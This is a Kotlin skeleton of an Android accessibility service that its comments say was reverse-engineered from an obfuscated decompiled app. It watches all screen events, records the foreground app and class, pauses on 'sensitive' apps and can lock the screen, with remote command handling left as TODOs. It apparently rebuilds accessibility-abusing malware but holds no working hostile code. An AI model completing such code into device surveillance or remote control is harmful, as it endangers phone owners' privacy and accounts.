package com.storm.safe.rock.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.content.Context
import android.os.PowerManager
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel

/**
 * Core AccessibilityService skeleton.
 *
 * Reverse-engineered from JADX reference `dqtvuisjd.java` (10,796 lines, 56 inner classes).
 * This is a Phase 3.1 skeleton: lifecycle, companion singleton, delegate dispatch framework.
 * Full command handling and specialized delegates arrive in Phase 4+.
 */
class MyAccessibilityService : AccessibilityService() {

    companion object {
        const val TAG = "MyAccessibilityService"
        const val CORE_SERVICE_CHECK_INTERVAL = 10_000L

        /** Event types routed to specialized handler only (not general delegate queue). */
        val FILTERED_EVENT_TYPES: Set<Int> = setOf(512, 1024, 262144, 524288, 1048576, 2097152)

        @Volatile
        private var instance: MyAccessibilityService? = null

        @Volatile
        var serviceStartTime: Long = 0L
            private set

        @Volatile
        var isSensitiveAppPaused: Boolean = false
            private set

        @Volatile
        var isPermissionRequesting: Boolean = false

        @Volatile
        var isVerifyPaused: Boolean = false
            private set

        @Volatile
        var isWebViewOpen: Boolean = false

        fun getInstance(): MyAccessibilityService? = instance
        fun isServiceRunning(): Boolean = instance != null
        fun isServiceReady(): Boolean = instance != null && serviceStartTime > 0

        fun pauseForSensitiveApp() {
            isSensitiveAppPaused = true
        }

        fun resumeFromSensitiveApp() {
            isSensitiveAppPaused = false
        }

        fun setVerifyPauseMode() {
            isVerifyPaused = true
        }

        fun clearVerifyPauseMode() {
            isVerifyPaused = false
        }

        fun lockScreen() {
            instance?.performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
        }
    }

    // --- Instance fields ---

    private var coroutineScope: CoroutineScope? = null

    var powerManager: PowerManager? = null
        private set

    var keyguardManager: KeyguardManager? = null
        private set

    var activePackageName: String = ""
        private set

    var activeClassName: String = ""
        private set

    /** Delegate queue. Type is Any for now; becomes AccessibilityDelegate in Phase 4. */
    private val delegateQueue = mutableListOf<Any>()

    private var lastCoreServiceCheckTime = 0L

    // --- Lifecycle ---

    override fun onServiceConnected() {
        super.onServiceConnected()
        android.util.Log.i(TAG, "[Service] Accessibility service connected")

        instance = this
        serviceStartTime = System.currentTimeMillis()

        try {
            powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
            keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
        } catch (e: Exception) {
            android.util.Log.e(TAG, "PowerManager/KeyguardManager init failed", e)
        }

        coroutineScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)

        // Configure accessibility service info
        @Suppress("DEPRECATION")
        try {
            val info = serviceInfo ?: AccessibilityServiceInfo()
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            info.flags = info.flags or
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY
            info.notificationTimeout = 100
            serviceInfo = info
        } catch (e: Exception) {
            android.util.Log.e(TAG, "ServiceInfo configuration failed", e)
        }

        // TODO Phase 3.2: Start AppCoreService
        // TODO Phase 2: Initialize NetworkManager
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        try {
            // Guard: screen off
            if (powerManager?.isInteractive == false) return
            // Guard: sensitive app paused
            if (isSensitiveAppPaused) return

            val eventType = event.eventType

            // Filter specialized event types
            if (eventType in FILTERED_EVENT_TYPES) {
                // TODO Phase 4: dispatch to specialized handler
                return
            }

            // Ensure core service running (throttled)
            ensureCoreServiceRunning()

            // Extract package and class
            val pkg = event.packageName?.toString()?.lowercase() ?: ""
            val cls = event.className?.toString() ?: ""

            if (pkg.isNotEmpty()) {
                activePackageName = pkg
            }
            if (cls.isNotEmpty()) {
                activeClassName = cls
            }

            // Dispatch to delegates
            dispatchToDelegates(event, pkg, cls)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "onAccessibilityEvent error", e)
        }
    }

    override fun onInterrupt() {
        android.util.Log.w(TAG, "onInterrupt called")
    }

    override fun onDestroy() {
        android.util.Log.i(TAG, "[Service] Accessibility service destroyed")
        coroutineScope?.cancel()
        coroutineScope = null
        instance = null
        serviceStartTime = 0L
        delegateQueue.clear()
        super.onDestroy()
    }

    // --- Delegate Management ---

    fun registerDelegate(delegate: Any) {
        synchronized(delegateQueue) {
            if (!delegateQueue.contains(delegate)) {
                delegateQueue.add(delegate)
            }
        }
    }

    fun unregisterDelegate(delegate: Any) {
        synchronized(delegateQueue) {
            delegateQueue.remove(delegate)
        }
    }

    fun clearDelegates() {
        synchronized(delegateQueue) {
            delegateQueue.clear()
        }
    }

    fun getDelegateCount(): Int = synchronized(delegateQueue) { delegateQueue.size }

    // --- Internal ---

    private fun dispatchToDelegates(
        event: AccessibilityEvent,
        packageName: String,
        className: String
    ) {
        synchronized(delegateQueue) {
            for (delegate in delegateQueue.toList()) {
                // TODO Phase 4: call delegate.onAccessibilityEvent(event, packageName, className)
            }
        }
    }

    private fun ensureCoreServiceRunning() {
        val now = System.currentTimeMillis()
        if (now - lastCoreServiceCheckTime > CORE_SERVICE_CHECK_INTERVAL) {
            lastCoreServiceCheckTime = now
            // TODO Phase 3.2: Check and start AppCoreService
        }
    }

    fun getCoroutineScope(): CoroutineScope? = coroutineScope
}
